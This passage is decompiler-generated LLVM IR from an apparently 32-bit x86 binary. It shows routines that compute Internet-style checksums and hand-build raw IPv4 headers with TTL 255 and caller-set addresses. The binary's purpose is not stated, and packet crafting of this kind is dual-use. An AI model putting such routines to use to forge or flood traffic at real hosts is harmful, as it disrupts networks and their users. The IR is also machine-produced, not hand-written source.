  uselistorder label %dec_label_pc_804c893, { 1, 0 }
  uselistorder label %dec_label_pc_804c85a, { 1, 0 }
  uselistorder label %dec_label_pc_804c821, { 1, 0 }
  uselistorder label %dec_label_pc_804c7e8, { 1, 0 }
  uselistorder label %dec_label_pc_804c7af, { 1, 0 }
  uselistorder label %dec_label_pc_804c776, { 1, 0 }
  uselistorder label %dec_label_pc_804c73d, { 1, 0 }
  uselistorder label %dec_label_pc_804c704, { 1, 0 }
  uselistorder label %dec_label_pc_804c6cb, { 1, 0 }
  uselistorder label %dec_label_pc_804c692, { 1, 0 }
  uselistorder label %dec_label_pc_804c659, { 1, 0 }
  uselistorder label %dec_label_pc_804c620, { 1, 0 }
  uselistorder label %dec_label_pc_804c5e7, { 1, 0 }
  uselistorder label %dec_label_pc_804c5ae, { 1, 0 }
  uselistorder label %dec_label_pc_804c575, { 1, 0 }
  uselistorder label %dec_label_pc_804c53c, { 1, 0 }
  uselistorder label %dec_label_pc_804c503, { 1, 0 }
  uselistorder label %dec_label_pc_804c4ca, { 1, 0 }
  uselistorder label %dec_label_pc_804c491, { 1, 0 }
  uselistorder label %dec_label_pc_804c458, { 1, 0 }
  uselistorder label %dec_label_pc_804c41f, { 1, 0 }
  uselistorder label %dec_label_pc_804c3e6, { 1, 0 }
  uselistorder label %dec_label_pc_804c3ad, { 1, 0 }
  uselistorder label %dec_label_pc_804c374, { 1, 0 }
  uselistorder label %dec_label_pc_804c33b, { 1, 0 }
  uselistorder label %dec_label_pc_804c302, { 1, 0 }
  uselistorder label %dec_label_pc_804c2c9, { 1, 0 }
  uselistorder label %dec_label_pc_804c290, { 1, 0 }
  uselistorder label %dec_label_pc_804c257, { 1, 0 }
  uselistorder label %dec_label_pc_804c21e, { 1, 0 }
  uselistorder label %dec_label_pc_804c1e5, { 1, 0 }
  uselistorder label %dec_label_pc_804c1ac, { 1, 0 }
  uselistorder label %dec_label_pc_804c173, { 1, 0 }
  uselistorder label %dec_label_pc_804c13a, { 1, 0 }
  uselistorder label %dec_label_pc_804c101, { 1, 0 }
  uselistorder label %dec_label_pc_804c0c8, { 1, 0 }
  uselistorder label %dec_label_pc_804c08f, { 1, 0 }
  uselistorder label %dec_label_pc_804c056, { 1, 0 }
  uselistorder label %dec_label_pc_804c01d, { 1, 0 }
  uselistorder label %dec_label_pc_804bfe4, { 1, 0 }
  uselistorder label %dec_label_pc_804bfab, { 1, 0 }
  uselistorder label %dec_label_pc_804bf72, { 1, 0 }
  uselistorder label %dec_label_pc_804bf39, { 1, 0 }
  uselistorder label %dec_label_pc_804bf00, { 1, 0 }
  uselistorder label %dec_label_pc_804bec7, { 1, 0 }
  uselistorder label %dec_label_pc_804be8e, { 1, 0 }
  uselistorder label %dec_label_pc_804be55, { 1, 0 }
  uselistorder label %dec_label_pc_804be1c, { 1, 0 }
  uselistorder label %dec_label_pc_804bde3, { 1, 0 }
  uselistorder label %dec_label_pc_804bdaa, { 1, 0 }
  uselistorder label %dec_label_pc_804bd71, { 1, 0 }
  uselistorder label %dec_label_pc_804bd38, { 1, 0 }
  uselistorder label %dec_label_pc_804bcff, { 1, 0 }
  uselistorder label %dec_label_pc_804bcc6, { 1, 0 }
  uselistorder label %dec_label_pc_804bc8d, { 1, 0 }
  uselistorder label %dec_label_pc_804bc54, { 1, 0 }
  uselistorder label %dec_label_pc_804bc1b, { 1, 0 }
  uselistorder label %dec_label_pc_804bbe2, { 1, 0 }
  uselistorder label %dec_label_pc_804bba9, { 1, 0 }
  uselistorder label %dec_label_pc_804bb73, { 1, 0 }
  uselistorder label %dec_label_pc_804bb3d, { 1, 0 }
  uselistorder label %dec_label_pc_804bb07, { 1, 0 }
  uselistorder label %dec_label_pc_804bad1, { 1, 0 }
  uselistorder label %dec_label_pc_804ba9b, { 1, 0 }
  uselistorder label %dec_label_pc_804ba65, { 1, 0 }
  uselistorder label %dec_label_pc_804ba2f, { 1, 0 }
  uselistorder label %dec_label_pc_804b9f9, { 1, 0 }
  uselistorder label %dec_label_pc_804b9c3, { 1, 0 }
  uselistorder label %dec_label_pc_804b98d, { 1, 0 }
  uselistorder label %dec_label_pc_804b957, { 1, 0 }
  uselistorder label %dec_label_pc_804b921, { 1, 0 }
  uselistorder label %dec_label_pc_804b8eb, { 1, 0 }
  uselistorder label %dec_label_pc_804b8b5, { 1, 0 }
  uselistorder label %dec_label_pc_804b87f, { 1, 0 }
  uselistorder label %dec_label_pc_804b849, { 1, 0 }
  uselistorder label %dec_label_pc_804b813, { 1, 0 }
  uselistorder label %dec_label_pc_804b7dd, { 1, 0 }
  uselistorder label %dec_label_pc_804b7a7, { 1, 0 }
  uselistorder label %dec_label_pc_804b771, { 1, 0 }
  uselistorder label %dec_label_pc_804b73b, { 1, 0 }
  uselistorder label %dec_label_pc_804b705, { 1, 0 }
  uselistorder label %dec_label_pc_804b6cf, { 1, 0 }
  uselistorder label %dec_label_pc_804b699, { 1, 0 }
  uselistorder label %dec_label_pc_804b663, { 1, 0 }
  uselistorder label %dec_label_pc_804b62d, { 1, 0 }
  uselistorder label %dec_label_pc_804b5f7, { 1, 0 }
  uselistorder label %dec_label_pc_804b5c1, { 1, 0 }
  uselistorder label %dec_label_pc_804b58b, { 1, 0 }
  uselistorder label %dec_label_pc_804b555, { 1, 0 }
  uselistorder label %dec_label_pc_804b51f, { 1, 0 }
  uselistorder label %dec_label_pc_804b4e9, { 1, 0 }
  uselistorder label %dec_label_pc_804b4b3, { 1, 0 }
  uselistorder label %dec_label_pc_804b47d, { 1, 0 }
  uselistorder label %dec_label_pc_804b447, { 1, 0 }
  uselistorder label %dec_label_pc_804b411, { 1, 0 }
  uselistorder label %dec_label_pc_804b3db, { 1, 0 }
  uselistorder label %dec_label_pc_804b3a5, { 1, 0 }
  uselistorder label %dec_label_pc_804b36f, { 1, 0 }
  uselistorder label %dec_label_pc_804b339, { 1, 0 }
  uselistorder label %dec_label_pc_804b303, { 1, 0 }
  uselistorder label %dec_label_pc_804b2cd, { 1, 0 }
  uselistorder label %dec_label_pc_804b297, { 1, 0 }
  uselistorder label %dec_label_pc_804b261, { 1, 0 }
  uselistorder label %dec_label_pc_804b22b, { 1, 0 }
  uselistorder label %dec_label_pc_804b1f5, { 1, 0 }
  uselistorder label %dec_label_pc_804b1bf, { 1, 0 }
  uselistorder label %dec_label_pc_804b189, { 1, 0 }
  uselistorder label %dec_label_pc_804b153, { 1, 0 }
  uselistorder label %dec_label_pc_804b11d, { 1, 0 }
  uselistorder label %dec_label_pc_804b0e7, { 1, 0 }
  uselistorder label %dec_label_pc_804b0b1, { 1, 0 }
  uselistorder label %dec_label_pc_804b07b, { 1, 0 }
  uselistorder label %dec_label_pc_804b045, { 1, 0 }
  uselistorder label %dec_label_pc_804b00f, { 1, 0 }
  uselistorder label %dec_label_pc_804afd9, { 1, 0 }
  uselistorder label %dec_label_pc_804afa3, { 1, 0 }
  uselistorder label %dec_label_pc_804af6d, { 1, 0 }
  uselistorder label %dec_label_pc_804af37, { 1, 0 }
  uselistorder label %dec_label_pc_804af01, { 1, 0 }
  uselistorder label %dec_label_pc_804aecb, { 1, 0 }
  uselistorder label %dec_label_pc_804ae95, { 1, 0 }
  uselistorder label %dec_label_pc_804ae5f, { 1, 0 }
  uselistorder label %dec_label_pc_804ae29, { 1, 0 }
  uselistorder label %dec_label_pc_804adf3, { 1, 0 }
  uselistorder label %dec_label_pc_804adbd, { 1, 0 }
  uselistorder label %dec_label_pc_804ad87, { 1, 0 }
  uselistorder label %dec_label_pc_804ad51, { 1, 0 }
  uselistorder label %dec_label_pc_804ad1b, { 1, 0 }
  uselistorder label %dec_label_pc_804ace5, { 1, 0 }
  uselistorder label %dec_label_pc_804acaf, { 1, 0 }
  uselistorder label %dec_label_pc_804ac79, { 1, 0 }
  uselistorder label %dec_label_pc_804ac43, { 1, 0 }
  uselistorder label %dec_label_pc_804ac0d, { 1, 0 }
  uselistorder label %dec_label_pc_804abd7, { 1, 0 }
  uselistorder label %dec_label_pc_804aba1, { 1, 0 }
  uselistorder label %dec_label_pc_804ab6b, { 1, 0 }
  uselistorder label %dec_label_pc_804ab35, { 1, 0 }
  uselistorder label %dec_label_pc_804aaff, { 1, 0 }
  uselistorder label %dec_label_pc_804aac9, { 1, 0 }
  uselistorder label %dec_label_pc_804aa93, { 1, 0 }
  uselistorder label %dec_label_pc_804aa5d, { 1, 0 }
  uselistorder label %dec_label_pc_804aa27, { 1, 0 }
  uselistorder label %dec_label_pc_804a9f1, { 1, 0 }
  uselistorder label %dec_label_pc_804a9bb, { 1, 0 }
  uselistorder label %dec_label_pc_804a985, { 1, 0 }
  uselistorder label %dec_label_pc_804a94f, { 1, 0 }
  uselistorder label %dec_label_pc_804a919, { 1, 0 }
  uselistorder label %dec_label_pc_804a8e3, { 1, 0 }
  uselistorder label %dec_label_pc_804a8ad, { 1, 0 }
  uselistorder label %dec_label_pc_804a877, { 1, 0 }
  uselistorder label %dec_label_pc_804a841, { 1, 0 }
  uselistorder label %dec_label_pc_804a80b, { 1, 0 }
  uselistorder label %dec_label_pc_804a7d5, { 1, 0 }
  uselistorder label %dec_label_pc_804a79f, { 1, 0 }
  uselistorder label %dec_label_pc_804a769, { 1, 0 }
  uselistorder label %dec_label_pc_804a733, { 1, 0 }
  uselistorder label %dec_label_pc_804a6fd, { 1, 0 }
  uselistorder label %dec_label_pc_804a6c7, { 1, 0 }
  uselistorder label %dec_label_pc_804a691, { 1, 0 }
  uselistorder label %dec_label_pc_804a65b, { 1, 0 }
  uselistorder label %dec_label_pc_804a625, { 1, 0 }
  uselistorder label %dec_label_pc_804a5ef, { 1, 0 }
  uselistorder label %dec_label_pc_804a5b9, { 1, 0 }
  uselistorder label %dec_label_pc_804a583, { 1, 0 }
  uselistorder label %dec_label_pc_804a54d, { 1, 0 }
  uselistorder label %dec_label_pc_804a517, { 1, 0 }
  uselistorder label %dec_label_pc_804a4e1, { 1, 0 }
  uselistorder label %dec_label_pc_804a4ab, { 1, 0 }
  uselistorder label %dec_label_pc_804a475, { 1, 0 }
  uselistorder label %dec_label_pc_804a43f, { 1, 0 }
  uselistorder label %dec_label_pc_804a409, { 1, 0 }
  uselistorder label %dec_label_pc_804a3d3, { 1, 0 }
  uselistorder label %dec_label_pc_804a39d, { 1, 0 }
  uselistorder label %dec_label_pc_804a367, { 1, 0 }
  uselistorder label %dec_label_pc_804a331, { 1, 0 }
  uselistorder label %dec_label_pc_804a2fb, { 1, 0 }
  uselistorder label %dec_label_pc_804a2c5, { 1, 0 }
  uselistorder label %dec_label_pc_804a28f, { 1, 0 }
  uselistorder label %dec_label_pc_804a259, { 1, 0 }
  uselistorder label %dec_label_pc_804a223, { 1, 0 }
  uselistorder label %dec_label_pc_804a1ed, { 1, 0 }
  uselistorder label %dec_label_pc_804a1b7, { 1, 0 }
  uselistorder label %dec_label_pc_804a181, { 1, 0 }
  uselistorder label %dec_label_pc_804a14b, { 1, 0 }
  uselistorder label %dec_label_pc_804a115, { 1, 0 }
  uselistorder label %dec_label_pc_804a0df, { 1, 0 }
}

define i32 @function_804d672(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d672:
  %v0_804d678 = load i32, i32* @global_var_8064b48.290, align 8
  %v1_804d680 = call i32 @function_8052231(i32 %v0_804d678)
  %v5_804d685 = and i32 %v1_804d680, %arg1
  %v1_804d68b = call i32 @function_80482f9(i32 %v5_804d685)
  %v1_804d695 = sub i32 -1, %arg1
  %v2_804d697 = and i32 %v1_804d68b, %v1_804d695
  %v5_804d699 = xor i32 %v2_804d697, %v5_804d685
  ret i32 %v5_804d699
}

define i32 @function_804d69e(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804d69e:
  %v0_804d6a3 = load i32, i32* @ebx, align 4
  %v4_804d6d233 = add i32 %arg2, -1
  %v9_804d6d234 = sub i32 0, %arg2
  %v10_804d6d235 = and i32 %arg2, %v9_804d6d234
  %v11_804d6d236 = icmp slt i32 %v10_804d6d235, 0
  %v12_804d6d237 = icmp eq i32 %v4_804d6d233, 0
  %v13_804d6d238 = icmp slt i32 %v4_804d6d233, 0
  %v3_804d6d639 = icmp eq i1 %v13_804d6d238, %v11_804d6d236
  %v4_804d6d640 = icmp eq i1 %v12_804d6d237, false
  %v5_804d6d641 = and i1 %v4_804d6d640, %v3_804d6d639
  br i1 %v5_804d6d641, label %dec_label_pc_804d6b7, label %dec_label_pc_804d6d8

dec_label_pc_804d6b7:                             ; preds = %dec_label_pc_804d69e, %dec_label_pc_804d6b7
  %stack_var_-24.045 = phi i16 [ %v9_804d6c7, %dec_label_pc_804d6b7 ], [ 0, %dec_label_pc_804d69e ]
  %stack_var_8.044 = phi i32 [ %v4_804d6ce, %dec_label_pc_804d6b7 ], [ %arg2, %dec_label_pc_804d69e ]
  %stack_var_4.043 = phi i16* [ %v23_804d6ca, %dec_label_pc_804d6b7 ], [ %arg1, %dec_label_pc_804d69e ]
  %v3_804d6c442 = phi i32 [ %v6_804d6c4, %dec_label_pc_804d6b7 ], [ 0, %dec_label_pc_804d69e ]
  %v4_804d6b7 = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804d6ba = load i16, i16* %stack_var_4.043, align 2
  %v3_804d6ba = zext i16 %v2_804d6ba to i32
  %sext51 = mul i32 %v3_804d6c442, 65536
  %v4_804d6c4 = sdiv i32 %sext51, 65536
  %v6_804d6c4 = add nsw i32 %v3_804d6ba, %v4_804d6c4
  %v11_804d6c4 = icmp ult i32 %v6_804d6c4, %v4_804d6c4
  %v26_804d6c4 = trunc i32 %v6_804d6c4 to i16
  %v7_804d6c7 = zext i1 %v11_804d6c4 to i16
  %v9_804d6c7 = add i16 %v7_804d6c7, %stack_var_-24.045
  %v5_804d6ca = add i32 %v4_804d6b7, 2
  %v23_804d6ca = inttoptr i32 %v5_804d6ca to i16*
  %v4_804d6ce = add i32 %stack_var_8.044, -2
  %v4_804d6d2 = add i32 %stack_var_8.044, -3
  %v9_804d6d2 = sub i32 2, %stack_var_8.044
  %v10_804d6d2 = and i32 %v4_804d6ce, %v9_804d6d2
  %v11_804d6d2 = icmp slt i32 %v10_804d6d2, 0
  %v12_804d6d2 = icmp eq i32 %v4_804d6d2, 0
  %v13_804d6d2 = icmp slt i32 %v4_804d6d2, 0
  %v3_804d6d6 = icmp eq i1 %v13_804d6d2, %v11_804d6d2
  %v4_804d6d6 = icmp eq i1 %v12_804d6d2, false
  %v5_804d6d6 = and i1 %v4_804d6d6, %v3_804d6d6
  br i1 %v5_804d6d6, label %dec_label_pc_804d6b7, label %dec_label_pc_804d6d8

dec_label_pc_804d6d8:                             ; preds = %dec_label_pc_804d6b7, %dec_label_pc_804d69e
  %v3_804d6c4.lcssa = phi i16 [ 0, %dec_label_pc_804d69e ], [ %v26_804d6c4, %dec_label_pc_804d6b7 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %dec_label_pc_804d69e ], [ %v23_804d6ca, %dec_label_pc_804d6b7 ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %dec_label_pc_804d69e ], [ %v4_804d6ce, %dec_label_pc_804d6b7 ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %dec_label_pc_804d69e ], [ %v9_804d6c7, %dec_label_pc_804d6b7 ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804d719.preheader, label %dec_label_pc_804d6de

dec_label_pc_804d6de:                             ; preds = %dec_label_pc_804d6d8
  %v1_804d6e1 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804d6e1 = load i8, i8* %v1_804d6e1, align 1
  %v3_804d6e1 = zext i8 %v2_804d6e1 to i32
  %v4_804d6ec = sext i16 %v3_804d6c4.lcssa to i32
  %v6_804d6ec = add nsw i32 %v3_804d6e1, %v4_804d6ec
  %v11_804d6ec = icmp ult i32 %v6_804d6ec, %v4_804d6ec
  %v26_804d6ec = trunc i32 %v6_804d6ec to i16
  %v7_804d6ef = zext i1 %v11_804d6ec to i16
  %v9_804d6ef = add i16 %v7_804d6ef, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804d719.preheader

dec_label_pc_804d719.preheader:                   ; preds = %dec_label_pc_804d6de, %dec_label_pc_804d6d8
  %v3_804d6fe.ph = phi i16 [ %v3_804d6c4.lcssa, %dec_label_pc_804d6d8 ], [ %v26_804d6ec, %dec_label_pc_804d6de ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804d6d8 ], [ %v9_804d6ef, %dec_label_pc_804d6de ]
  %v4_804d71920 = sext i16 %v3_804d6fe.ph to i32
  %v4_804d71c21 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804d71f22 = udiv i32 %v4_804d71920, 65536
  %v4_804d71f23 = mul i32 %v4_804d71c21, 65536
  %v5_804d71f24 = or i32 %v4_804d71f23, %v3_804d71f22
  %v2_804d72325 = udiv i32 %v4_804d71c21, 65536
  %v2_804d72626 = or i32 %v5_804d71f24, %v2_804d72325
  %v3_804d72627 = icmp eq i32 %v2_804d72626, 0
  %v1_804d72a28 = icmp eq i1 %v3_804d72627, false
  br i1 %v1_804d72a28, label %dec_label_pc_804d6f4, label %dec_label_pc_804d72c

dec_label_pc_804d6f4:                             ; preds = %dec_label_pc_804d719.preheader, %dec_label_pc_804d6f4
  %v2_804d72331 = phi i32 [ %v2_804d723, %dec_label_pc_804d6f4 ], [ %v2_804d72325, %dec_label_pc_804d719.preheader ]
  %v5_804d71f30 = phi i32 [ %v5_804d71f, %dec_label_pc_804d6f4 ], [ %v5_804d71f24, %dec_label_pc_804d719.preheader ]
  %v4_804d71929 = phi i32 [ %v4_804d719, %dec_label_pc_804d6f4 ], [ %v4_804d71920, %dec_label_pc_804d719.preheader ]
  %v2_804d70f = add i32 %v5_804d71f30, %v4_804d71929
  %v7_804d70f = icmp ult i32 %v2_804d70f, %v4_804d71929
  %v3_804d711 = zext i1 %v7_804d70f to i32
  %v5_804d711 = add nuw nsw i32 %v3_804d711, %v2_804d72331
  %sext = mul i32 %v2_804d70f, 65536
  %v4_804d719 = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804d711, 65536
  %v4_804d71c = sdiv i32 %sext50, 65536
  %v3_804d71f = udiv i32 %v4_804d719, 65536
  %v5_804d71f = or i32 %sext50, %v3_804d71f
  %v2_804d723 = udiv i32 %v4_804d71c, 65536
  %v2_804d726 = or i32 %v5_804d71f, %v2_804d723
  %v3_804d726 = icmp eq i32 %v2_804d726, 0
  %v1_804d72a = icmp eq i1 %v3_804d726, false
  br i1 %v1_804d72a, label %dec_label_pc_804d6f4, label %dec_label_pc_804d719.dec_label_pc_804d72c_crit_edge

dec_label_pc_804d719.dec_label_pc_804d72c_crit_edge: ; preds = %dec_label_pc_804d6f4
  br label %dec_label_pc_804d72c

dec_label_pc_804d72c:                             ; preds = %dec_label_pc_804d719.dec_label_pc_804d72c_crit_edge, %dec_label_pc_804d719.preheader
  %v4_804d719.lcssa = phi i32 [ %v4_804d719, %dec_label_pc_804d719.dec_label_pc_804d72c_crit_edge ], [ %v4_804d71920, %dec_label_pc_804d719.preheader ]
  %v1_804d730 = urem i32 %v4_804d719.lcssa, 65536
  %v1_804d732 = xor i32 %v1_804d730, 65535
  store i32 %v0_804d6a3, i32* @ebx, align 4
  ret i32 %v1_804d732

; uselistorder directives
  uselistorder i32 %v5_804d71f, { 1, 0 }
  uselistorder i32 %v4_804d719, { 1, 0, 2 }
  uselistorder i32 %v2_804d72325, { 1, 0 }
  uselistorder i32 %v4_804d71c21, { 1, 0 }
  uselistorder i32 %v4_804d71920, { 2, 1, 0 }
  uselistorder i32 %v4_804d6ec, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804d6c4.lcssa, { 1, 0 }
  uselistorder i32 %v4_804d6d2, { 1, 0 }
  uselistorder i32 %v4_804d6ce, { 0, 2, 1 }
  uselistorder i32 %v6_804d6c4, { 1, 2, 0 }
  uselistorder i32 %v4_804d6c4, { 1, 0 }
  uselistorder label %dec_label_pc_804d6f4, { 1, 0 }
  uselistorder label %dec_label_pc_804d6b7, { 1, 0 }
}

define i32 @function_804d73d(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804d73d:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804d73d = load i32, i32* @ebp, align 4
  store i32 %v0_804d73d, i32* %stack_var_-4, align 4
  %v4_804d73d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804d73d, i32* @ebp, align 4
  %v1_804d751 = add i32 %arg1, 12
  %v2_804d751 = inttoptr i32 %v1_804d751 to i32*
  %v3_804d751 = load i32, i32* %v2_804d751, align 4
  %v1_804d75a = add i32 %arg1, 16
  %v2_804d75a = inttoptr i32 %v1_804d75a to i32*
  %v3_804d75a = load i32, i32* %v2_804d75a, align 4
  %v2_804d76f = call i32 @function_8052210(i16 20)
  %v1_804d788 = call i32 @function_80529ba(i32 32)
  store i32 %v1_804d788, i32* %ecx.global-to-local, align 4
  %v2_804d798 = inttoptr i32 %v1_804d788 to i32*
  store i32 %v3_804d751, i32* %v2_804d798, align 4
  %v1_804d79d = load i32, i32* %ecx.global-to-local, align 4
  %v2_804d79d = add i32 %v1_804d79d, 4
  %v3_804d79d = inttoptr i32 %v2_804d79d to i32*
  store i32 %v3_804d75a, i32* %v3_804d79d, align 4
  %v1_804d7a3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804d7a3 = add i32 %v1_804d7a3, 8
  %v3_804d7a3 = inttoptr i32 %v2_804d7a3 to i32*
  store i32 0, i32* %v3_804d7a3, align 4
  store i32 %tmp3, i32* %ecx.global-to-local, align 4
  %v1_804d7ac = add i32 %v1_804d788, 12
  store i32 %v1_804d7ac, i32* %edx.global-to-local, align 4
  %v2_804d7af = load i32, i32* %arg2, align 4
  %v2_804d7b1 = inttoptr i32 %v1_804d7ac to i32*
  store i32 %v2_804d7af, i32* %v2_804d7b1, align 4
  %v0_804d7b3 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d7b3 = add i32 %v0_804d7b3, 4
  %v2_804d7b3 = inttoptr i32 %v1_804d7b3 to i32*
  %v3_804d7b3 = load i32, i32* %v2_804d7b3, align 4
  %v1_804d7b6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d7b6 = add i32 %v1_804d7b6, 4
  %v3_804d7b6 = inttoptr i32 %v2_804d7b6 to i32*
  store i32 %v3_804d7b3, i32* %v3_804d7b6, align 4
  %v0_804d7b9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d7b9 = add i32 %v0_804d7b9, 8
  %v2_804d7b9 = inttoptr i32 %v1_804d7b9 to i32*
  %v3_804d7b9 = load i32, i32* %v2_804d7b9, align 4
  %v1_804d7bc = load i32, i32* %edx.global-to-local, align 4
  %v2_804d7bc = add i32 %v1_804d7bc, 8
  %v3_804d7bc = inttoptr i32 %v2_804d7bc to i32*
  store i32 %v3_804d7b9, i32* %v3_804d7bc, align 4
  %v0_804d7bf = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d7bf = add i32 %v0_804d7bf, 12
  %v2_804d7bf = inttoptr i32 %v1_804d7bf to i32*
  %v3_804d7bf = load i32, i32* %v2_804d7bf, align 4
  %v1_804d7c2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d7c2 = add i32 %v1_804d7c2, 12
  %v3_804d7c2 = inttoptr i32 %v2_804d7c2 to i32*
  store i32 %v3_804d7bf, i32* %v3_804d7c2, align 4
  %v0_804d7c5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d7c5 = add i32 %v0_804d7c5, 16
  %v2_804d7c5 = inttoptr i32 %v1_804d7c5 to i32*
  %v3_804d7c5 = load i32, i32* %v2_804d7c5, align 4
  %v1_804d7c8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d7c8 = add i32 %v1_804d7c8, 16
  %v3_804d7c8 = inttoptr i32 %v2_804d7c8 to i32*
  store i32 %v3_804d7c5, i32* %v3_804d7c8, align 4
  %v2_804d7d8 = inttoptr i32 %v1_804d788 to i16*
  %v3_804d7d8 = call i32 @function_804d69e(i16* %v2_804d7d8, i32 32)
  %v1_804d7dd = urem i32 %v3_804d7d8, 65536
  %v1_804d7ea = call i32 @function_8053391(i32 %v1_804d788)
  ret i32 %v1_804d7dd

; uselistorder directives
  uselistorder i32 %v1_804d788, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804d7f5(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804d7f5:
  %tmp10 = trunc i32 %arg4 to i8
  %sext = mul i32 %arg4, 16777216
  %v4_804d7fb = sdiv i32 %sext, 16777216
  %v4_804d801 = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_804d81c = add i32 %v4_804d801, 1
  %v2_804d81c = inttoptr i32 %v1_804d81c to i8*
  store i8 0, i8* %v2_804d81c, align 1
  %v1_804d826 = add i32 %arg5, 20
  %v1_804d82f = trunc i32 %v1_804d826 to i16
  %v3_804d82f = add i32 %v4_804d801, 2
  %v4_804d82f = inttoptr i32 %v3_804d82f to i16*
  store i16 %v1_804d82f, i16* %v4_804d82f, align 2
  %v2_804d833 = call i32 @function_80482f9(i32 %v4_804d7fb)
  %v1_804d83e = trunc i32 %v2_804d833 to i16
  %v3_804d83e = add i32 %v4_804d801, 4
  %v4_804d83e = inttoptr i32 %v3_804d83e to i16*
  store i16 %v1_804d83e, i16* %v4_804d83e, align 2
  %v1_804d845 = add i32 %v4_804d801, 6
  %v2_804d845 = inttoptr i32 %v1_804d845 to i16*
  store i16 0, i16* %v2_804d845, align 2
  %v1_804d84e = add i32 %v4_804d801, 8
  %v2_804d84e = inttoptr i32 %v1_804d84e to i8*
  store i8 -1, i8* %v2_804d84e, align 1
  %v3_804d859 = add i32 %v4_804d801, 9
  %v4_804d859 = inttoptr i32 %v3_804d859 to i8*
  store i8 %tmp10, i8* %v4_804d859, align 1
  %v1_804d85f = add i32 %v4_804d801, 10
  %v2_804d85f = inttoptr i32 %v1_804d85f to i16*
  store i16 0, i16* %v2_804d85f, align 2
  %v2_804d86b = add i32 %v4_804d801, 12
  %v3_804d86b = inttoptr i32 %v2_804d86b to i32*
  store i32 %arg3, i32* %v3_804d86b, align 4
  %v2_804d874 = add i32 %v4_804d801, 16
  %v3_804d874 = inttoptr i32 %v2_804d874 to i32*
  store i32 %arg2, i32* %v3_804d874, align 4
  ret i32 %arg2

; uselistorder directives
  uselistorder i8 -1, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_804d879(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d879:
  %stack_var_-4 = alloca i32, align 4
  %v0_804d879 = load i32, i32* @ebp, align 4
  store i32 %v0_804d879, i32* %stack_var_-4, align 4
  %v4_804d87f = add i32 %arg1, -2
  %v9_804d87f = sub i32 1, %arg1
  %v10_804d87f = and i32 %v9_804d87f, %arg1
  %v11_804d87f = icmp slt i32 %v10_804d87f, 0
  %v12_804d87f = icmp eq i32 %v4_804d87f, 0
  %v13_804d87f = icmp slt i32 %v4_804d87f, 0
  %v3_804d883 = icmp eq i1 %v13_804d87f, %v11_804d87f
  %v4_804d883 = icmp eq i1 %v12_804d87f, false
  %v5_804d883 = and i1 %v4_804d883, %v3_804d883
  br i1 %v5_804d883, label %dec_label_pc_804d88e, label %dec_label_pc_804d8a0

dec_label_pc_804d88e:                             ; preds = %dec_label_pc_804d879
  %v1_804d894 = call i32 @function_8050b60(i32 %arg1)
  %v2_804d8a3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804d8a0

dec_label_pc_804d8a0:                             ; preds = %dec_label_pc_804d879, %dec_label_pc_804d88e
  %v2_804d8a3 = phi i32 [ %v2_804d8a3.pre, %dec_label_pc_804d88e ], [ %v0_804d879, %dec_label_pc_804d879 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804d88e ], [ 1, %dec_label_pc_804d879 ]
  store i32 %v2_804d8a3, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804d87f, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d8a0, { 1, 0 }
}

define i32 @function_804d8a5() local_unnamed_addr {
dec_label_pc_804d8a5:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  store i32 512, i32* %eax.global-to-local, align 4
  %v2_804d8c5 = call i32 @function_8050ed8(i32* null)
  store i32 %v2_804d8c5, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8c5, i32* @ebx, align 4
  %v1_804d8cc = call i32 @function_80482f9(i32 0)
  %v1_804d8d1 = load i32, i32* @ebx, align 4
  %v2_804d8d1 = xor i32 %v1_804d8d1, %v1_804d8cc
  store i32 %v2_804d8d1, i32* @eax, align 4
  %v1_804d8d6 = call i32 @function_8053768(i32 %v2_804d8d1)
  store i32 %v1_804d8d6, i32* %eax.global-to-local, align 4
